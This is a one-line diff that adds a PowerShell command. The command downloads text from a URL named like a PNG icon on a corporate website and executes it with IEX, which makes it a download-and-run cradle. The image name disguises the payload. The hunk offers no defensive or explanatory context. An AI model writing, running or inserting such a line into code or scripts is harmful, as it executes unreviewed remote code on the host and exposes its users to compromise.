@@ -1,0 +1,1 @@
+IEX (new-object Net.WebClient).DownloadString('https://www.euroclear.com/dam/apple-touch-icon-60-x3.png')
